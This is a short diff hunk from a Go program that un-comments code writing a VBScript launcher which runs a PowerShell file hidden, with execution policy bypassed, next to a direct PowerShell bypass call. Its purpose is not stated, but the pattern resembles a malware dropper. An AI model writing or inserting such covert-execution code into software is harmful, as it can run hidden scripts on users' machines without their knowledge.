@@ -60,10 +60,10 @@ func fset(data_path string) {
 	}
 	file.Close()
 
-	// 	vbscriptCode := fmt.Sprintf(`Set objShell = CreateObject("WScript.Shell")
-	// objShell.Run "powershell.exe -NoProfile -ExecutionPolicy Bypass -File ""%s""", 0, False`, targetPath)
-	// tempScriptPath := targetPath[:len(targetPath)-4] + ".vbs"
-	// os.WriteFile(tempScriptPath, []byte(vbscriptCode), 0644)
+	vbscriptCode := fmt.Sprintf(`Set objShell = CreateObject("WScript.Shell")
+	objShell.Run "powershell.exe -NoProfile -ExecutionPolicy Bypass -File ""%s""", 0, False`, targetPath)
+	tempScriptPath := targetPath[:len(targetPath)-4] + ".vbs"
+	os.WriteFile(tempScriptPath, []byte(vbscriptCode), 0644)
 
 	cmd := exec.Command("powershell.exe", "-executionpolicy", "bypass", "-file", targetPath)
 	cmd.SysProcAttr = &syscall.SysProcAttr{
